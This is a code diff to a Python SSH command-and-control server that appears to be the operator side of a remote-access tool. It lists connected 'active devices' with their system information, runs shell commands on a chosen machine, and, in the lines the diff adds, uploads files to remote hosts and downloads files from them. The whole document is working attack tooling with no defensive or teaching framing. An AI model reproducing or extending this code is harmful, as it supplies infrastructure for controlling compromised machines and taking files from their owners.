@@ -50,26 +50,80 @@ def start_management(client_info):
                 break
             command = input(f'{directory} -< ').strip()
             if not command:
-                chan.send(b'empty_input')
+                chan.send(b'keep_alive')
                 continue
             if command == 'back':
                 print('[+] Going back to the main menu...')
                 chan.send(b'keep_alive')
                 return
+            if command == "clear":
+                os.system('cls' if os.name == 'nt' else 'clear')
+                chan.send(b'keep_alive')
+                continue
             if command != 'exit':
+                if command.startswith('upload'):
+                    file_name = command[7:].strip().strip("'\"")
+                    file_path = Path(CWD / file_name).resolve()
+
+                    if not file_path.exists() or not file_path.is_file():
+                        print(f'[-] Error: Local file: {file_name} not found.')
+                        chan.send(b'keep_alive')
+                        continue
+
+                    with open(file_path, 'rb') as file:
+                        file_data = file.read()
+
+                    chan.send(command.encode('utf-8'))
+                    chan.sendall(f'{len(file_data)}\n'.encode('utf-8'))
+                    chan.sendall(file_data)
+
+                    len_bytes = b''
+                    while not len_bytes.endswith(b'\n'):
+                        len_bytes += chan.recv(1)
+                    data_size = int(len_bytes.decode('utf-8').strip())
+
+                    result = b''
+                    while len(result) < data_size:
+                        chunk = chan.recv(data_size - len(result))
+                        result += chunk
+                    print(result.decode('utf-8', errors='ignore'), end='')
+                    continue
                 chan.send(command.encode('utf-8'))
-                result = b''
-                while not result.endswith(b'\n'):
+                len_bytes = b''
+                while not len_bytes.endswith(b'\n'):
                     chunk = chan.recv(1)
                     if not chunk:
                         break
-                    result += chunk
-                print(result.decode('utf-8', errors='ignore'), end='')
+                    len_bytes += chunk
+                try:
+                    data_size = int(len_bytes.decode('utf-8').strip())
+                except ValueError:
+                    data_size = 0
+                if data_size > 0:
+                    result = b''
+                    while len(result) < data_size:
+                        chunk = chan.recv(data_size - len(result))
+                        if not chunk:
+                            break
+                        result += chunk
+                    
+                    if command.startswith('download'):
+                        file_name = command[9:].strip().strip("'\"")
+                        if result.startswith(b'Error:'):
+                            print(result.decode('utf-8', errors='ignore'), end='')
+                        else:
+                            save_path = Path(CWD / file_name)
+                            with open(save_path, 'wb') as file:
+                                file.write(result)
+                            print(f'[+] File {file_name} downloaded successfully.\n')
+                    else:
+                        print(result.decode('utf-8', errors='ignore'), end='')
             else:
                 chan.send('exit'.encode('utf-8'))
                 print(f'[+] Session with ID {c_id} completely closed.')
                 with clients_lock:
                     if c_id in active_clients: del active_clients[c_id]
+                chan.close()
                 session.close()
                 break
     except Exception as e:
@@ -92,9 +146,11 @@ def handle_client_connection(client_socket, address):
             print('[-] No connection.')
             sys.exit(1)
 
+        sys_info = chan.recv(1024).decode('utf-8').strip()
+
         with clients_lock:
             id_identifier += 1
-            active_clients[id_identifier] = {'id': id_identifier, 'address': address[0], 'channel': chan, 'session': bhSession}
+            active_clients[id_identifier] = {'id': id_identifier, 'address': address[0], 'sys_info': sys_info, 'channel': chan, 'session': bhSession}
 
     except Exception as e:
         print(f'SSH initialization error: {e}')
@@ -133,7 +189,7 @@ def main_menu():
                 else:
                     print('\n[+] Active devices:')
                     for c_id, info in active_clients.items():
-                        print(f'ID [{c_id}] -> {info['address']}')
+                        print(f'ID [{c_id}] -> {info['sys_info']} ({info['address']})')
         elif choice == '2':
             with clients_lock:
                 if not active_clients:
